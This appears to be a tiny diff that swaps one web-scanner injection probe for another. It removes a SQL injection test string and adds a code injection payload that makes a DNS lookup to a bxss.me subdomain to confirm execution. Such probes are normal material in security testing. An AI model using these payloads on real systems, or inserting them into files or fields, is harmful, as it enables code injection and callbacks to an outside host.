@@ -1,1 +1,1 @@
--1 OR 2+29-29-1=0+0+0+1
+'.gethostbyname(lc('hitzk'.'tgfkmeood3177.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(102).chr(79).chr(120).chr(87).'
